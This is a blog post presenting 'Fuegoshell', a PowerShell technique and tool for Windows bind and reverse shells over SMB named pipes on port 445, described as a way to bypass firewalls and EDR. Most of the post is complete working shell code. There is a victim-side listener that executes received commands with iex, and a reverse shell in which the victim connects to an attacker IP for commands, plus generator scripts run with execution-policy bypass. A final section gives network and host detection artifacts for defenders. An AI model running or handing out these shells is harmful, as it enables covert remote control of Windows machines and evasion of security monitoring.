---
title: 'Fuegoshell : Windows remote shell re-using TCP 445'
date: 2024-02-11
author: "Viking"
layout: post
permalink: /fuegoshell/
disqus_identifier: 0000-0000-0000-0011
description: ""
cover: assets/uploads/2024/02/fuegoshell.png
tags:
  - Windows
  - EDR
  - Powershell
translation:
  - en
---

In this short blogpost we will discuss how named pipes and Powershell oneliners could be used for creating Windows bind / reverse shell using Windows SMB port.  

<!--more-->

## "When Red meets Blue..."

Last year I had a chance to go to [x33fcon][LINK1] for the first time. I highly recommend this conference for many reasons, here are just a few :  
- technical level of the speakers 
- a well organised conference  
- red and blue talks & mindsets
- good quality of free workshops
- afterParty with worldwide hackers on the (Dragon cruise) pirate ship, can't forget this !  

One of the talks caught my attention : [(In)Secure Remote Operations: What Sucks, Rocks, and a Super-CLI][LINK2] by [Yossi Sassi][LINK3], here is the abstract :  
***Every admin tool is an attack tool. Coming from dozens of engagements on remoting architectures & Red Team assessments in 4 continents, this Hands-on session dives into the good, bad & "wow! can this be done??" of Windows ‘Living off the land’ remote operations, Protocols and APIs***

One of the tricks I learnt is that Powershell allows to create communication chanel with a remote computer using some interesting points : in your opinion, which ones ?

## About Fuegoshell

`Fuegoshell` could be useful when your Remote Code Execution or data exfiltration require bypassing some restrictions (firewalls) or detections (EDR). It's more a trick than a tool but it provides a PS1 script for generating Powershell oneliners. Those shells (bind or reverse) are focusing on :  

- no local admin privilege required
- no need to Bind() / listen on a new server local port, re-use of TCP 445
- use of named pipes for sending commands / receiving results
- keep it simple using Powershell oneliners for all this stuff  

The project is available here : [https://github.com/v1k1ngfr/fuegoshell][LINK4]  

## Creating a "fuegoshell" bind shell

How does it works ?  
We launch a listener on the "victim" and connect to it from the "attacker" :   

[![fuegoshell_bind](/assets/uploads/2024/02/fuegoshell_bind.png)](/assets/uploads/2024/02/fuegoshell_bind.png)  

What steps need to be taken ?  

### **On the victim side : listen for incoming connection**  

We will :  
- open a named pipe which listen for incoming connection
- create streams for read/write operation through the named pipe
- wait for commands, execute it and then send back the result to the attacker     

In a Powershell command prompt just run :  


```

$npipeServer = new-object System.IO.Pipes.NamedPipeServerStream('fuegoshell', [System.IO.Pipes.PipeDirection]::InOut)
try {
    'Fuegoshell-server started'
    'Waiting for client connection'
    $npipeServer.WaitForConnection()
    'Connection established'

    $pipeReader = new-object System.IO.StreamReader($npipeServer)
    $script:pipeWriter = new-object System.IO.StreamWriter($npipeServer)
    $pipeWriter.AutoFlush = $true

    #$clientName = $env:computername
    #WriteToPipeAndLog "Connected to $clientName !"
    
    # say hello
    $pipeWriter.WriteLine("Connected on "+$env:computername)

    while (1)
    {
        $pipeWriter.WriteLine('YOURMOVE')
        $command = $pipeReader.ReadLine()
        if ($command -eq 'exit') { break }
        try {
            # Some code that may cause an error
            $data = iex $command | Out-String ;
        }
        catch {
            ### Logging the error
            # local log :
            # Write-host -f red "Encountered Error:"$_.Exception.Message
            # remote log : 
            # $data = $Error[0] | Out-String ;
            
            ### no error display
            $data = "error : maybe empty or wrong command line"
        }
        
        
        $msg = $data
        $pipeWriter.WriteLine($msg)
    }

    Start-Sleep -Seconds 2
}
finally {
    'Shell exiting'
    $npipeServer.Dispose()
}

```

### **On the attacker side : connect to the victim**

We will :  
- open a named pipe outgoing connection to the victim 
- create streams for read/write operation through the named pipe
- send commands to execute, retrieve the result and display it  

In a Powershell command prompt just run :  

```
param ($ComputerName = '192.168.49.1')

$npipeClient = new-object System.IO.Pipes.NamedPipeClientStream($ComputerName, 'fuegoshell', [System.IO.Pipes.PipeDirection]::InOut,
                                                                [System.IO.Pipes.PipeOptions]::None, 
                                                                [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
$pipeReader = $pipeWriter = $null
try {
    'Fuegoshell-client started'
    'Connecting to shell...'
    $npipeClient.Connect()

    $pipeReader = new-object System.IO.StreamReader($npipeClient)
    $pipeWriter = new-object System.IO.StreamWriter($npipeClient)
    $pipeWriter.AutoFlush = $true
 
    # wait hello from the other side
    $pipeReader.ReadLine()
    
    while (1) {      
        while (($msg = $pipeReader.ReadLine()) -notmatch 'YOURMOVE') {
                $msg
            }
        $command = Read-Host 'fuegobindshell>'
        if ($command -eq 'exit') { 
            $pipeWriter.WriteLine($command) # send command
            break 
        }
            $pipeWriter.WriteLine($command) # send command
            $currentDate = Get-Date -Format "yyyyMMdd_HHmmss" ;
            $cmdlogmsg = "[cmdlog> "
            $data = $pipeReader.ReadLine()          # get the result
            # display result
            $msg = $currentDate+$cmdlogmsg+$data
            $msg
    }
}
finally {
    'Shell exiting'
    $npipeClient.Dispose()
}

```
***Note : of course your current credentials must be valid on the victim machine***   

Here is an example below of running in "bind" mode. Retrieve the [fuegoshell project from Github][LINK4], go to fuegoshell directory and just run :  

```
powershell -exec bypass .\generate_bind_fuegoshell.ps1 
```

- boxed in red : the command used to generate oneliners
- boxed in orange : the oneliners run onto the victim
- boxed in green : the oneliners run onto the attacker
- highlighted in yellow : the fuegoshell running

[![fuegoshell_bind_example](/assets/uploads/2024/02/fuegoshell_bind_example.png)](/assets/uploads/2024/02/fuegoshell_bind_example.png)

***Note : attacker is on the left side of this picture and victim is on the right side***

## Creating a "fuegoshell" reverse shell

How does it works ? I just wanted to complexify the monitoring of named pipes content that could be done by security products. We will create two channels :  
- CONTROL-CHANNEL : used for sending commands
- DATA-CHANNEL : used for result display purpose

[![fuegoshell_rev](/assets/uploads/2024/02/fuegoshell_rev.png)](/assets/uploads/2024/02/fuegoshell_rev.png)

What steps need to be taken ?  

### **On the attacker side : create both communication channels**
We will :  

- open a named pipes listening for incoming connections from the victim 
- send command to execute and display the result sent by the victim 

Because we create two channels we will avoid confusion separating consoles.  
In the powershell console 1 run :  

```
$host.ui.RawUI.WindowTitle = "DATA-CHANNEL";
$pipedata = new-object System.IO.Pipes.NamedPipeServerStream 'fuego-data','In'; 
$pipedata.WaitForConnection();
$sr= new-object System.IO.StreamReader $pipedata;
while (($data = $sr.ReadLine()) -ne $null) {
     echo $data.ToString()
};
$sr.Dispose();
$pipedata.Dispose();
```

In the powershell console 2 run :

```
$host.ui.RawUI.WindowTitle = "CONTROL-CHANNEL";
$pipecontrol = new-object System.IO.Pipes.NamedPipeServerStream 'fuego-control','Out';
$pipecontrol.WaitForConnection();
$sw = new-object System.IO.StreamWriter $pipecontrol;
$sw.AutoFlush = $true;
$myprompt = 'fuegoShell>';
do { 
    $mycmd = Read-Host -Prompt $myprompt;
    $sw.WriteLine($mycmd) 
    } until ($mycmd -eq 'exit');
$sw.Dispose();
$pipecontrol.Dispose();
```


### **On the victim side : connect to the attacker** 

We will : 

- open a named pipe, connecting to the "**data channel**" listening on attacker's  machine
- open a second named pipe, connecting to the "**control channel**" also listening on attacker's  machine
- retrieve the command to execute (from the control pipe), execute the command, send back the result (using the data pipe)
- close the channels when we are done 

In a Powershell command prompt :  


```
# open control and data channels
$pipedata = new-object System.IO.Pipes.NamedPipeClientStream '192.168.49.116','fuego-data','Out';
$pipedata.Connect();
$sw = new-object System.IO.StreamWriter $pipedata;
$sw.AutoFlush = $true;
$currentHost = iex 'hostname' | Out-String;
$sw.WriteLine("-------------------------");
$sw.WriteLine("[+] New incoming shell from : ");
$sw.WriteLine($currentHost);$sw.WriteLine("---");
$pipeListener = new-object System.IO.Pipes.NamedPipeClientStream '192.168.49.116','fuego-control','In'; 
$pipeListener.Connect();
$sr= new-object System.IO.StreamReader $pipeListener;$mylogmsg = '[cmdlog]> ';

# wait for commands from the C2, execute and send the result
while (($data = $sr.ReadLine()) -ne 'exit') {
    $currentDate = Get-Date -Format "yyyyMMdd_HHmmss" ;
    $res = iex $data | Out-String ;
    $sw.WriteLine($currentDate+$mylogmsg+$data);
    $sw.WriteLine($res)
    };

# close named pipes
$sw.Dispose();
$pipeListener.Dispose();
$sr.Dispose();
$pipedata.Dispose();
```

***Note : of course your current credentials must be valid on the attacker machine***  

Here is an example below of running in "reverse" mode. Retrieve the [fuegoshell project from Github][LINK4], go to fuegoshell directory and just run :  

```
powershell -exec bypass .\generate_reverse_fuegoshell.ps1 
```

- boxed in red : the command used to generate oneliners
- boxed in orange : the oneliners run onto the victim
- boxed in green : the oneliners run onto the attacker
- highlighted in yellow : the fuegoshell running

[![fuegoshell_reverse_example](/assets/uploads/2024/02/fuegoshell_reverse_example.png)](/assets/uploads/2024/02/fuegoshell_reverse_example.png)

***Note : attacker is on the left side of this picture and victim is on the right side***

## Detection  

It's not my current job but I will try to give some artifacts for detection opportunities by blueteamers (and areas of improvement for redteamers).  

### Network based detection  

`Fuegoshell` trafic is not encrypted, here are some key points :  
- TCP protocol, port 445
- SMB Protocol  
- SMB Command : Ioctl (11)  
- SMB Tree Id : contains IPC$ 
- SMB Ioctl Resquest (0x0b) : FSCTL_PIPE_WAIT (0x00110018)  
- Name : value set by maldev author so it's probably not the best choice for detection.

[![wireshark_rev](/assets/uploads/2024/02/wireshark_rev.png)](/assets/uploads/2024/02/wireshark_rev.png)

### Host based detection  

`Fuegoshell` can be run in bind shell or reverse shell mode. Artifacts are not the same for both but I think one of common detection area is the use of AMSI, triggering alerts when using one of these functions (indeed they are unlikely to be used frequently) :  
- System.IO.Pipes.NamedPipeClientStream
- System.IO.Pipes.NamedPipeServerStream

#### Bind shell detection   

When using the 'bind shell' mode, a named pipe is created on the victim :  

[![pex_bind_NP](/assets/uploads/2024/02/pex_bind_NP.png)](/assets/uploads/2024/02/pex_bind_NP.png)

Using Sysmon event 17 can be used for detection : the pipe is created by Image powershell.exe. The PipeName value is set by maldev author so it's probably not the best choice for detection.  

```
Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2024-04-26 14:46:33.997
ProcessGuid: {ccf50e9a-be49-662b-7f05-00000000dc00}
ProcessId: 6684
PipeName: \PSHost.133586163937360232.6684.DefaultAppDomain.powershell
Image: C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: WIN10X64VIKTEST\viking

Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2024-04-26 14:46:53.356
ProcessGuid: {ccf50e9a-b68f-662b-3705-00000000dc00}
ProcessId: 1296
PipeName: \fuegoshell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: WIN10X64VIKTEST\viking
```  

[![sysmon_create_bind](/assets/uploads/2024/02/sysmon_create_bind.png)](/assets/uploads/2024/02/sysmon_create_bind.png)

Powershell can list all pipes, maybe it can help for hunting operations :  

```  
[System.IO.Directory]::GetFiles("\\.\\pipe\\")
```  

[![psh_bind](/assets/uploads/2024/02/psh_bind.png)](/assets/uploads/2024/02/psh_bind.png)

#### Reverse shell detection  

When using the 'reverse shell' mode, no named pipe is created on the victim but a new ***pipe*** entry is created in the \Device\MuP : 

[![pex_rev_mup](/assets/uploads/2024/02/pex_rev_mup.png)](/assets/uploads/2024/02/pex_rev_mup.png)

The sysinternals handle.exe can list some entries (but some may not be listed as shown below !), maybe it can help for hunting operations :  

[![handle_rev_mup](/assets/uploads/2024/02/handle_rev_mup.png)](/assets/uploads/2024/02/handle_rev_mup.png)

Procmon gives more detailed information : ZwCreateFile is used when System.IO.Pipes.NamedPipeClientStream open netwotk connection to the attacker machine.   

[![procmon_rev](/assets/uploads/2024/02/procmon_rev.png)](/assets/uploads/2024/02/procmon_rev.png)

And here it is I hope you learnt something. Thanks for reading, feedbacks are welcome !  


[LINK1]: https://www.x33fcon.com/#!archive/2023/con.md  
[LINK2]: https://www.youtube.com/watch?v=PfjPBEqn51M 
[LINK3]: https://twitter.com/yossi_sassi
[LINK4]: https://github.com/v1k1ngfr/fuegoshell/


